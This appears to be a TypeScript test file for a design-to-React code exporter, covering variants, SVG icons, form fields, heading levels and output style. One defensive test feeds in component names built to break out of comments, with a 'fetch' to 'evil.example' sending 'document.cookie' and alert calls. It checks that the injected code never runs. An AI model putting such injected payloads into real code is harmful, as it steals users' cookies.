      const tsx = toReact(doc, ['set'], {styling, measurer}).files.find(f => f.path.endsWith('.tsx'))!;
      const out = ts.transpileModule(tsx.contents, {reportDiagnostics: true, compilerOptions: {jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.ESNext}});
      assert.deepEqual(out.diagnostics?.map(d => ts.flattenDiagnosticMessageText(d.messageText, '\n')), [], tsx.contents);
    }
});

test('names and texts from a hostile file never become code in the export', () => {
  // A shared .rdesign or Figma file is the attacker's: a property name or a variant value that closed the
  // doc comment above its prop put its own statements into the project the developer then runs.
  let doc = createDocument('p');
  doc = add(doc, 'COMPONENT', {id: 'a', parentId: 'p', name: 'Kind=x */ }; alert(1); interface Z { /*', width: 40, height: 20});
  doc = add(doc, 'COMPONENT', {id: 'b', parentId: 'p', name: 'Kind=Normal', x: 60, width: 40, height: 20});
  doc = combineAsVariants(doc, ['a', 'b'], 'set').doc;
  doc = update(doc, 'set', {name: 'Card'});
  const label = 'x */ }; fetch("https://evil.example/" + document.cookie); interface Z { /*';
  doc = addComponentProperty(doc, 'set', {name: label, type: 'TEXT', defaultValue: "one\ntwo 'three' \\ */"}).doc;
  doc = addComponentProperty(doc, 'set', {name: 'Flag\n*/ alert(2) /*', type: 'BOOLEAN', defaultValue: true}).doc;
  for (const styling of ['css-modules', 'tailwind', 'inline'] as const) {
    const tsx = toReact(doc, ['set'], {styling, measurer}).files.find(f => f.path.endsWith('.tsx'))!;
    const out = ts.transpileModule(tsx.contents, {reportDiagnostics: true, compilerOptions: {jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.ESNext}});
    assert.deepEqual(out.diagnostics?.map(d => ts.flattenDiagnosticMessageText(d.messageText, '\n')), [], tsx.contents);
    // Nothing of the names runs: no call of fetch or alert, no extra declaration; the words stay in comments.
    const source = ts.createSourceFile('x.tsx', tsx.contents, ts.ScriptTarget.ES2022, true, ts.ScriptKind.TSX);
    const calls: string[] = [];
    const visit = (node: ts.Node) => {
      if (ts.isCallExpression(node) && ts.isIdentifier(node.expression)) calls.push(node.expression.text);
      ts.forEachChild(node, visit);
    };
    visit(source);
    assert.ok(!calls.includes('fetch') && !calls.includes('alert'), `${styling}: ${calls.join(', ')}\n${tsx.contents}`);
    const declared = source.statements.filter(statement => ts.isTypeAliasDeclaration(statement) || ts.isInterfaceDeclaration(statement));
    assert.deepEqual(declared.map(statement => (statement as ts.TypeAliasDeclaration | ts.InterfaceDeclaration).name.text), ['CardProps']);
  }
  // A default text of several lines stays text in the usage examples (texts are given where the component is used): it
  // parses, and nothing of it is code.
  const example = toReact(doc, ['set'], {measurer}).entries[0].examples![0];
  const parsed = ts.transpileModule(`const e = ${example};`, {reportDiagnostics: true, compilerOptions: {jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2022}});
  assert.deepEqual(parsed.diagnostics?.map(d => ts.flattenDiagnosticMessageText(d.messageText, '\n')), [], example);
  const tree = ts.createSourceFile('e.tsx', `const e = ${example};`, ts.ScriptTarget.ES2022, true, ts.ScriptKind.TSX);
  const texts: string[] = [];
  const collect = (node: ts.Node) => {
    if (ts.isStringLiteral(node) || ts.isJsxText(node)) texts.push(node.text);
    ts.forEachChild(node, collect);
  };
  collect(tree);
  assert.ok(texts.join('').includes("'three' \\ */"), `${example} → ${JSON.stringify(texts)}`);
});

test('a vector icon shown by a boolean property stays an SVG inside the condition', () => {
  // Arrange: a component whose vector icon's visibility is bound to "Icon".
  let doc = createDocument('p', 'Home');
  doc = add(doc, 'COMPONENT', {id: 'chip', parentId: 'p', name: 'Chip', width: 120, height: 32, autoLayout: {...defaultAutoLayout('HORIZONTAL'), itemSpacing: 4}});
  doc = add(doc, 'VECTOR', {id: 'chip-icon', parentId: 'chip', name: 'Check', width: 16, height: 16, fills: [], strokes: [solid({r: 0, g: 0, b: 0})],
    vectorPaths: [{windingRule: 'NONZERO', commands: [{type: 'M', x: 2, y: 8}, {type: 'L', x: 6, y: 12}, {type: 'L', x: 14, y: 4}]}]});
  doc = add(doc, 'TEXT', {id: 'chip-label', parentId: 'chip', name: 'Label', text: defaultTextProps('Done')});
  const toggle = addComponentProperty(doc, 'chip', {name: 'Icon', type: 'BOOLEAN', defaultValue: true});
  doc = bindProperty(toggle.doc, 'chip-icon', 'visible', toggle.key).doc;

  // Act
  const result = toReact(doc, ['chip'], {styling: 'css-modules', measurer});

  // Assert: the icon is drawn as an icon component under the prop's condition, not as an empty box.
  const tsx = file(result, 'src/components/Chip.tsx');
  assert.match(tsx, /\{showIcon && <CheckIcon className=\{styles\.check\} \/>\}/, tsx);
  assert.match(file(result, 'src/icons/CheckIcon.tsx'), /<svg [^>]*viewBox="0 0 16 16"/);
});

test('variants that differ only in their picture switch the picture by the variant prop', () => {
  // Arrange: an icon set whose variants are vector-only (the whole component is one SVG), and a tab set whose variants
  // differ in the vector beside the label.
  const path = (d: 'home' | 'search' | 'bell') => ({windingRule: 'NONZERO' as const, commands: d === 'home'
    ? [{type: 'M' as const, x: 2, y: 8}, {type: 'L' as const, x: 8, y: 2}, {type: 'L' as const, x: 14, y: 8}]
    : d === 'search' ? [{type: 'M' as const, x: 2, y: 2}, {type: 'L' as const, x: 14, y: 14}] : [{type: 'M' as const, x: 8, y: 0}, {type: 'L' as const, x: 8, y: 16}]});
  let doc = createDocument('p', 'Home');
  const icons = (['home', 'search', 'bell'] as const).map((kind, i) => {
    doc = add(doc, 'COMPONENT', {id: 'i-' + kind, parentId: 'p', name: `Type=${{home: 'Home', search: 'Search', bell: 'Bell'}[kind]}`, x: i * 40, width: 16, height: 16, fills: []});
    doc = add(doc, 'VECTOR', {id: 'i-' + kind + '-v', parentId: 'i-' + kind, name: 'Outline', width: 16, height: 16, fills: [], strokes: [solid({r: 0, g: 0, b: 0})], strokeWeight: 2, vectorPaths: [path(kind)]});
    return 'i-' + kind;
  });
  doc = combineAsVariants(doc, icons, 'icon').doc;
  doc = update(doc, 'icon', {name: 'Icon'});
  const tabs = (['home', 'search'] as const).map((kind, i) => {
    doc = add(doc, 'COMPONENT', {id: 't-' + kind, parentId: 'p', name: `Section=${kind === 'home' ? 'Home' : 'Search'}`, y: 100 + i * 40, width: 120, height: 32,
      autoLayout: {...defaultAutoLayout('HORIZONTAL'), itemSpacing: 4}});
    doc = add(doc, 'VECTOR', {id: 't-' + kind + '-v', parentId: 't-' + kind, name: 'Mark', width: 16, height: 16, fills: [], strokes: [solid({r: 0, g: 0, b: 0})], strokeWeight: 2, vectorPaths: [path(kind)]});
    doc = add(doc, 'TEXT', {id: 't-' + kind + '-l', parentId: 't-' + kind, name: 'Label', text: defaultTextProps('Section')});
    return 't-' + kind;
  });
  doc = combineAsVariants(doc, tabs, 'tab').doc;
  doc = update(doc, 'tab', {name: 'Tab'});
  doc = add(doc, 'FRAME', {id: 'screen', parentId: 'p', name: 'Screen', y: 300, width: 200, height: 100, autoLayout: {...defaultAutoLayout('HORIZONTAL'), itemSpacing: 8}});
  doc = createInstance(doc, 'i-search', {parentId: 'screen', newId: 'use-search'}).doc;

  for (const styling of ['css-modules', 'tailwind', 'inline'] as const) {
    // Act
    const result = toReact(doc, ['icon', 'tab', 'screen'], {styling, measurer});

    // Assert: every variant's path is in the code and drawn only for its own option; the usage picks the option.
    const icon = file(result, 'src/components/Icon.tsx');
    for (const d of ['M2 8L8 2L14 8', 'M2 2L14 14', 'M8 0L8 16']) assert.equal(icon.split(d).length - 1, 1, `${styling}: ${d} once in\n${icon}`);
    assert.match(icon, /export function Icon\(\{variant = 'home', /, icon);
    assert.match(icon, /variant === 'search' &&/, icon);
    assert.match(icon, /variant === 'bell' &&/, icon);
    const tab = file(result, 'src/components/Tab.tsx');
    // The tab's pictures are icons of their own (src/icons), each shown for its option.
    const icons = result.files.filter(f => f.path.startsWith('src/icons/')).map(f => f.contents).join('\n');
    for (const d of ['M2 8L8 2L14 8', 'M2 2L14 14']) assert.equal(icons.split(d).length - 1, 1, `${styling}: ${d} once in the icons\n${icons}`);
    assert.match(tab, /export function Tab\(\{section = 'home', /, tab);
    assert.match(tab, /\{section === 'search' && <\w+Icon\d* /, tab);
    assert.match(file(result, 'src/screens/Screen.tsx'), /<Icon variant="search"/);
    for (const f of result.files.filter(f => f.path.endsWith('.tsx'))) {
      const parsed = ts.transpileModule(f.contents, {reportDiagnostics: true, compilerOptions: {jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2022}});
      assert.deepEqual(parsed.diagnostics?.map(d => ts.flattenDiagnosticMessageText(d.messageText, '\n')), [], `${styling} ${f.path}`);
    }
  }
});

/** A starter template, built with the test measurer (templates are deterministic). */
function templateDoc(id: TemplateId): DesignDocument {
  let seq = 0;
  return templateById(id)!.build({measurer, newId: () => `n${(seq++).toString(36)}`});
}

const named = (doc: DesignDocument, type: SceneNode['type'], name: string) => Object.values(doc.nodes).find(node => node.type === type && node.name === name)!;

test('a main component or a variant set standing in a screen is used there, each look once', () => {
  // Arrange: the UI kit's page holds its components' sets and a card component, not instances of them.
  const doc = templateDoc('ui-kit');

  // Act
  const result = toReact(doc, [named(doc, 'FRAME', 'UI kit').id], {measurer});

  // Assert: each set is its looks as usages (hover drawn as its own variant is the browser's state, so it is left out);
  // the components the page holds are written as components.
  const tsx = file(result, 'src/screens/UiKit.tsx');
  assert.equal(tsx.match(/<Button\b[^>]*>Button<\/Button>/g)?.length, 8, tsx);
  assert.match(tsx, /<Button variant="outline" disabled className=\{styles\.\w+\}>Button<\/Button>/);
  assert.match(tsx, /<Checkbox checked label="Remember me"/, 'true is a bare attribute');
  assert.match(tsx, /<Checkbox checked="mixed" label="Remember me"/);
  assert.match(tsx, /<Toggle checked label="Notifications"/);
  assert.match(tsx, /<Card heading="Account area redesign" description="[^"]+" className=\{styles\.\w+\} \/>/, 'a main component used in place passes its own texts');
  assert.doesNotMatch(tsx, /<button|<input|htmlFor/, 'no component is written out in the screen');
  for (const name of ['Button', 'Checkbox', 'Toggle', 'InputField', 'Tag', 'Avatar', 'Card']) assert.ok(result.files.some(f => f.path === `src/components/${name}.tsx`), name);
  // The set's dashed purple frame is the editor's.
  const css = file(result, 'src/screens/UiKit.module.css');
  assert.match(css, /\.buttonVariants \{/);
  assert.doesNotMatch(css, /9747FF|dashed/i);
});

test('a variant that writes its own text where the others show a prop shows the prop; its usage passes that text', () => {
  // Arrange: "Input field" binds "Hint" in every state but "Error", which writes its message there.
  const doc = templateDoc('ui-kit');

  // Act
  const result = toReact(doc, [named(doc, 'COMPONENT_SET', 'Input field').id], {measurer});

  // Assert
  const tsx = file(result, 'src/components/InputField.tsx');
  assert.match(tsx, /\{hint && <p id=\{hintId\} className=\{styles\.hint\}>\{hint\}<\/p>\}/);
  assert.doesNotMatch(tsx, /has no domain/, 'no copy is baked into the component');
  assert.ok(result.entries[0].examples?.includes('<InputField error label="Email" hint="The address has no domain, for example @mail.com" />'), result.entries[0].examples?.join('\n'));
});

test('a field\'s value text bound to a property is its placeholder, whatever its variants are called', () => {
  // Arrange: the mobile kit's field binds "Value"; its variants are "State=…".
  const doc = templateDoc('mobile');

  // Act
  const result = toReact(doc, [named(doc, 'COMPONENT_SET', 'Input field').id, named(doc, 'FRAME', 'Sign in').id], {measurer});

  // Assert: no `value` prop that nothing reads; the native placeholder, given by a usage only when it is another.
  const tsx = file(result, 'src/components/InputField.tsx');
  assert.doesNotMatch(tsx, /value/);
  assert.match(tsx, /<input id=\{inputId\} className=\{styles\.input\} placeholder="name@example\.com"/);
  assert.match(file(result, 'src/screens/SignIn.tsx'), /<InputField label="Email" placeholder="anna@studio\.example" \/>/);
});

test('a field inside a field is one field: its label points at its input', () => {
  // Arrange: "Input field" holds a label, "Field" (a box that reads as a field itself) and a hint.
  let doc = createDocument('p');
  doc = add(doc, 'FRAME', {id: 'f', parentId: 'p', name: 'Form', width: 320, height: 200, autoLayout: {...defaultAutoLayout('VERTICAL'), itemSpacing: 8}});
  doc = add(doc, 'FRAME', {id: 'field', parentId: 'f', name: 'Input field', width: 280, height: 90, autoLayout: {...defaultAutoLayout('VERTICAL'), itemSpacing: 4}});
  doc = add(doc, 'TEXT', {id: 'label', parentId: 'field', name: 'Label', text: defaultTextProps('Email')});
  doc = add(doc, 'FRAME', {id: 'box', parentId: 'field', name: 'Field', width: 280, height: 40, fills: [solid({r: 1, g: 1, b: 1})], strokes: [solid({r: 0.8, g: 0.8, b: 0.8})], autoLayout: defaultAutoLayout('HORIZONTAL')});
  doc = add(doc, 'TEXT', {id: 'value', parentId: 'box', name: 'Value', width: 200, text: defaultTextProps('name@mail.ru')});
  doc = add(doc, 'TEXT', {id: 'hint', parentId: 'field', name: 'Hint', text: defaultTextProps("We'll email you a link")});

  // Act
  const tsx = file(toReact(doc, ['f'], {measurer}), 'src/screens/Form.tsx');

  // Assert
  const target = /htmlFor="([^"]+)"/.exec(tsx)?.[1];
  assert.ok(target, tsx);
  assert.match(tsx, new RegExp(`<input id="${target}" [^>]*placeholder="name@mail\\.ru" aria-describedby="${target}-hint" />`));
  assert.match(tsx, new RegExp(`<p id="${target}-hint"`));
});

test('headings: a section titled "Button" is one, a logo and the line above a heading are not, and no level is skipped', () => {
  // Act
  const kitDoc = templateDoc('ui-kit');
  const kit = file(toReact(kitDoc, [named(kitDoc, 'FRAME', 'UI kit').id], {measurer}), 'src/screens/UiKit.tsx');
  const siteDoc = templateDoc('site');
  const site = file(toReact(siteDoc, [named(siteDoc, 'FRAME', 'Home — 1440').id], {measurer}), 'src/screens/Home1440.tsx');

  // Assert
  const levels = (tsx: string) => [...tsx.matchAll(/<h([1-6])\b/g)].map(match => Number(match[1]));
  for (const tsx of [kit, site]) {
    const list = levels(tsx);
    assert.equal(list[0], 1, tsx);
    assert.ok(list.every((level, i) => i === 0 || level <= list[i - 1] + 1), `skips a level: ${list.join(' ')}`);
  }
  assert.match(kit, /<h2 className=\{styles\.\w+\}>Button<\/h2>/, 'a text called "Button" in a section called "Button" is not a button');
  assert.deepEqual(levels(kit).slice(1, 7), [2, 2, 2, 2, 2, 2], 'the sections are all h2');
  assert.doesNotMatch(site, /<h\d[^>]*>(Pulse|Mint|Loft|Features)</, 'a logo\'s wordmark and an overline are text');
});

test('the output reads as a developer writes it: plain lists, merged rules, no needless fragments or long lines', () => {
  // Arrange
  const site = templateDoc('site');
  const kit = templateDoc('ui-kit');
  const mobile = templateDoc('mobile');

  // Act
  const home = file(toReact(site, [named(site, 'FRAME', 'Home — 1440').id], {measurer}), 'src/screens/Home1440.tsx');
  const kitCode = toReact(kit, [named(kit, 'COMPONENT_SET', 'Checkbox').id, named(kit, 'COMPONENT_SET', 'Avatar').id, named(kit, 'COMPONENT_SET', 'Input field').id], {measurer});
  const inline = toReact(kit, [named(kit, 'COMPONENT_SET', 'Input field').id], {styling: 'inline', measurer});
  const icon = file(toReact(mobile, [named(mobile, 'COMPONENT_SET', 'Icon').id], {measurer}), 'src/components/Icon.tsx');

  // Assert: items that differ in one text are the texts; fields are named for what they are, not the content of a layer.
  assert.match(home, /^const menuTexts = \['Features', 'Pricing', 'Customers', 'Blog'\];$/m);
  assert.match(home, /\{menuTexts\.map\(menuText => \(\n\s+<span key=\{menuText\} className=\{styles\.menuText\}>\{menuText\}<\/span>/);
  assert.match(home, /\{title: '10:00 · Emma K\.', subtitle: 'Cut and style'\},/);
  // Neighbouring rules that say the same thing are one rule.
  assert.match(file(kitCode, 'src/components/Checkbox.module.css'), /\.root\[aria-checked='true'\] \.box,\n\.root\[aria-checked='mixed'\] \.box \{\n  background: var\(--color-brand-500\);/);
  // A block whose one child would make a long line lists it on its own.
  assert.match(file(kitCode, 'src/components/Avatar.tsx'), /<div className=\{cx\(styles\.root, className\)\} data-size=\{size\} \{\.\.\.props\}>\n\s+<span className=\{styles\.initials\}>\{children\}<\/span>\n\s+<\/div>/);
  for (const f of [...kitCode.files, ...inline.files]) assert.ok(f.contents.split('\n').every(line => line.length <= 220), `${f.path} has a very long line`);
  // A variant's picture of one element needs no fragment around it, and a path repeats no fill="none" the <svg> gives it.
  assert.match(icon, /\{variant === 'home' && \(\n\s+<path /);
  assert.doesNotMatch(icon, /<path [^>]*fill="none"/);
  // Inline styles read `disabled`; the field's input still gets it.
  assert.match(file(inline, 'src/components/InputField.tsx'), /<input id=\{inputId\} [^>]* disabled=\{disabled\} \{\.\.\.props\} \/>/);
});
